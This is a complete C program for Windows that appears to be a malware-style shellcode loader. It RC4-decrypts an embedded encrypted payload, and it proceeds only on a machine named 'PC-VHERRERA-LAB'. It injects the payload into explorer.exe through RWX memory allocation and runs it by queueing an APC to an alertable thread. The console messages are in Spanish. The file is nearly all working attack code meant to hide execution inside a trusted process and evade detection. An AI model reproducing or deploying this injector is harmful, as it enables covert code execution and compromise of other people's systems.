#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

#define ARRAY_LENGTH	256

unsigned char s[ARRAY_LENGTH];
int rc4_i;
int rc4_j;
HANDLE snapshot;

void swap(unsigned char *s1, unsigned char *s2)
{
	char temp = *s1;

	*s1 = *s2;
	*s2 = temp;
}


int InitRC4(void)
{
	int i;

	for(i=0 ; i< ARRAY_LENGTH; i++)
		s[i] = i;

	rc4_i = rc4_j = 0;

	return 1;
}

int DoKSA(unsigned char *key, int key_len)
{

	for(rc4_i = 0; rc4_i < ARRAY_LENGTH; rc4_i++)
	{
		rc4_j = (rc4_j + s[rc4_i] + key[rc4_i % key_len])% ARRAY_LENGTH;
		swap(&s[rc4_i], &s[rc4_j]);
	}
	
	// Reset counters for Prga

	rc4_i = rc4_j = 0;

}


char GetPRGAOutput(void)
{
	rc4_i = (rc4_i +1 ) % ARRAY_LENGTH;

	rc4_j = (rc4_j + s[rc4_i]) % ARRAY_LENGTH;

	swap(&s[rc4_i], &s[rc4_j]);

	return s[(s[rc4_i] + s[rc4_j]) % ARRAY_LENGTH];
}

void printLastError() {
    char error[255];
    FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
               NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
               error, (sizeof(error) / sizeof(char)), NULL);
     printf(error);
}

DWORD getProcessPID() {
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	
	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	
	if (Process32First(snapshot, &processEntry)) {
		while (strcmp(processEntry.szExeFile, "explorer.exe") != 0) {
			Process32Next(snapshot, &processEntry);
		}
	}
    return processEntry.th32ProcessID;
}

BOOL IsAlertable(HANDLE hp, HANDLE ht, LPVOID addr[6]) {
    CONTEXT   c;
    BOOL      alertable = FALSE;
    DWORD     i;
    ULONG_PTR p[8];
    SIZE_T    rd;
    
    // read the context
    c.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
    GetThreadContext(ht, &c);
    
    // for each alertable function
    for(i=0; i<6 && !alertable; i++) {
      // compare address with program counter
      if((LPVOID)c.Rip == addr[i]) {
        switch(i) {
          // ZwDelayExecution
          case 0 : {
            alertable = (c.Rcx & TRUE);
            break;
          }
          // NtWaitForSingleObject
          case 1 : {
            alertable = (c.Rdx & TRUE);
            break;
          }
          // NtWaitForMultipleObjects
          case 2 : {
            alertable = (c.Rsi & TRUE);
            break;
          }
          // NtSignalAndWaitForSingleObject
          case 3 : {
            alertable = (c.Rsi & TRUE);
            break;
          }
          // NtUserMsgWaitForMultipleObjectsEx
          case 4 : {
            ReadProcessMemory(hp, (LPVOID)c.Rsp, p, sizeof(p), &rd);
            alertable = (p[5] & MWMO_ALERTABLE);
            break;
          }
          // NtRemoveIoCompletionEx
          case 5 : {
            ReadProcessMemory(hp, (LPVOID)c.Rsp, p, sizeof(p), &rd);
            alertable = (p[6] & TRUE);
            break;
          }            
        }
      }
    }
    return alertable;
}

int main(int argc, char* argv[]) {

    char pcname[MAX_PATH];
    DWORD dwSize = MAX_PATH;
    GetComputerNameA(pcname, &dwSize);
    int pid = 0;
    THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
    HANDLE threadHandle = NULL;
    unsigned char keystream_byte;

    InitRC4();
	
	DoKSA("inc0d3", 6);

    unsigned char payload[] = 
                            "\x88\xa1\x26\x40\xb5\x38\xd1\xcc\xf0\x6f\x95\x33\x33\x24\x60"
                            "\x97\xfb\x45\x88\xe2\x99\xa1\xce\xdb\xd0\x39\x07\x97\x0d\xe9"
                            "\x6a\x1a\x81\x59\x97\xe4\xee\x10\x4e\x36\x26\x3d\x3e\x94\x29"
                            "\x04\x22\x56\xbb\xba\x7f\xad\x63\xdc\x13\xfc\x34\x48\x6d\x98"
                            "\xf6\xca\xc0\xc0\xe6\xab\xc1\x41\x61\x52\x96\xcf\x6a\x4e\x1b"
                            "\x5c\xee\x41\x46\xde\x6e\x55\x67\xed\x28\xad\x20\x9f\xbf\x79"
                            "\x6c\xb1\x78\x89\xd0\xb9\xe0\x24\xf5\xd9\xb6\xd5\x17\xe5\x9d"
                            "\xa1\xf3\xed\xf4\xdc\x49\x0e\xdd\xb4\x14\x14\x87\x05\xb3\xef"
                            "\xa6\x21\x3e\xfc\xf7\x8e\x59\xba\x6c\xca\x4c\x68\xc0\x80\xe7"
                            "\x45\x11\x73\xe1\x6b\x52\x7d\xad\xfd\xe3\xae\x0a\x00\xe8\x1f"
                            "\x4b\x1f\x37\xab\x28\x15\x51\x88\x32\x79\x1c\x5b\x03\xd1\x5d"
                            "\x57\x88\x28\x20\x13\x09\xb1\xe8\xe4\x55\x63\xc9\x7b\x50\x31"
                            "\x6f\x71\x09\xa0\x67\xfb\xa8\x90\x77\xdc\x6a\x7c\x64\x5e\x2c"
                            "\x64\x3b\xfc\x4b\xde\x57\x16\xe0\xb1\xec\x5a\x03\x96\x87\x07"
                            "\xd9\x39\xae\x54\x71\x56\xed\x33\xca\x9b\x3d\x91\x38\x3e\x49"
                            "\x72\xbb\xd0\x85\xeb\x7e\x89\x54\xf1\x1f\x40\x3a\x11\xf2\x4a"
                            "\x9e\x98\xd6\x60\x26\x33\x64\xd1\x49\x53\x5d\xdf\x69\xaa\x83"
                            "\x3e\xcf\xbe\xe6\x43\x90\x87\x2a\xd4\xfd\x93\x00\xed\x34\x0e"
                            "\x22\xde\x30\xbc\xc3\xa4\x6a\x2b\xfe\xea\xe3\x7a\x74\x58\x68"
                            "\x52\x70\x00\x11\x9a\xf6\x0b\x83\xa6\xa9\xff\x4c\x25\xcf\x6c"
                            "\x77\x95\x08\xff\x1f\xa4\xb8\x31\x5c\x4b\x6d\x01\x40\x69\x66"
                            "\x0f\x93\xed\xa4\xf7\x63\x25\x7a\xf6\xec\x8e\x1b\x02\x2b\x6e"
                            "\x83\x9e\x9b\x7f\xde\xab\x18\x14\xdd\xbc\xd2\xe7\xdf\x8b\x13"
                            "\x78\xa3\x38\xe7\x46\x44\xcd\xab\x40\x4f\x3d\xac\xc0\x5b\xd2"
                            "\x0b\xb0\x72\x54\xdb\x1e\xf4\x81\x14\xcc\x65\xd3\x78\x7d\x57"
                            "\xb9\x59\xaa\xd7\x87\x40\xc9\x7a\xfe\x68\x99\x1a\xfc\x4b\xea"
                            "\x22\x4f\xcb\x70\xff\xfc\xc2\xc7\x47\x47\x5e\x7c\xbe\x34\x6f"
                            "\xdd\x6d\xf0\x74\xa4\xa8\x39\xc1\x2f\x41\xbf\xa6\x63\x65\x90"
                            "\x3d\xf3\xd8\x83\xbf\x9c\x7d\x3d\xb9\x70\x7e\x5f\x99\x06\x97"
                            "\xae\xbc\xf3\x1a\x47\x95\xe7\x7f\xcc\x20\xca\x77\x9f\x34\xe4"
                            "\x48\x01\x44\x81\x77\x05\xf1\xb2\x95\xbd\x36\xf2\xc8\xde\xc4"
                            "\x57\x34\x90\x9e\xf8\x23\xd2\xad\x91\x79\x21\xf5\x26\x9e\xa3"
                            "\xdb\x72\x02\xda\xd8\xbe\x2b\xc7\xa9\x6b\x3d\x25\x54\xad\x67"
                            "\x8c\x08\x3f\x07\x0d\x44\xfd\x11\x8e\x65\xb4\x53\x79\x52\x49";

    if (!strcmp(pcname, "PC-VHERRERA-LAB")) {

        LPVOID f[6];
        HMODULE m;
        DWORD i;
        char *api[6]={
            "ZwDelayExecution", 
            "ZwWaitForSingleObject",
            "NtWaitForMultipleObjects",
            "NtSignalAndWaitForSingleObject",
            "NtUserMsgWaitForMultipleObjectsEx",
            "NtRemoveIoCompletionEx"};
      
        for(i=0; i<6; i++) {
            m = GetModuleHandleA(i == 4 ? "win32u" : "ntdll");
            f[i] = (LPBYTE)GetProcAddress(m, api[i]) + 0x14;
        }

        pid = (int)getProcessPID();
        if (pid <= 0) {
            printf("\n[!] No se encuentra proceso explorer");
            return 0;
        }
        printf("\n[+] Proceso explorer.exe encontrado con PID %d", pid);


        HANDLE p = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
        if (p == NULL) {
            printf("\nError al controlar el proceso:");
            return 1;
        }
        printf("\n[+] Proceso controlado correctamente en 0x%p", p);

        LPVOID vAlloc = VirtualAllocEx(p, NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); 
        if (vAlloc == NULL) {
            printf("\nError al solicitar memoria en el proceso: ");
            return 1;
        }
        printf("\n[+] Memoria creada en el espacio del proceso correctamente en 0x%p", vAlloc);
        LPTHREAD_START_ROUTINE apcRoutine = (LPTHREAD_START_ROUTINE)vAlloc;

        for(size_t i = 0, len = sizeof(payload) - 1; i < len; i++) {
            keystream_byte = GetPRGAOutput();
            payload[i] = payload[i] ^ keystream_byte;
        }
        
        BOOL result = WriteProcessMemory(p, vAlloc, payload, sizeof(payload), NULL);

        if (result == FALSE) {
            printf("\nError al escribir la shellcode en la memoria del proceso: ");
            return 1;
        }
        printf("\n[+] Shellcode copiada en la memoria del proceso correctamente");

        long unsigned int queue;

        if (Thread32First(snapshot, &threadEntry)) {
            do {
                if ((int)threadEntry.th32OwnerProcessID == pid) {
                    threadHandle = OpenThread(THREAD_ALL_ACCESS , FALSE, threadEntry.th32ThreadID);
                    if (threadHandle != NULL) {
                        if (IsAlertable(p, threadHandle, f)) {
                            printf("\n[+] Hilo en estado 'alertable' encontrado. Shell ejecutada.");
                            if (QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, queue) == 0) {
                                printf("\n[!] Error al agregar APC al hilo con ID %d - Error Code: %d -- ", (int) threadEntry.th32ThreadID, GetLastError());
                                printLastError();
                            }
                            Sleep(1000 * 2);
                            break;
                        }
                    }
                    printf("\n[!] Error al abrir hilo con ID %d - Error Code: %d -- ", (int) threadEntry.th32ThreadID, GetLastError());
                    printLastError();
                }
            } while (Thread32Next(snapshot, &threadEntry));
        }

    }
    else {
        printf("\n[!] Error");
    }

    return 0;
}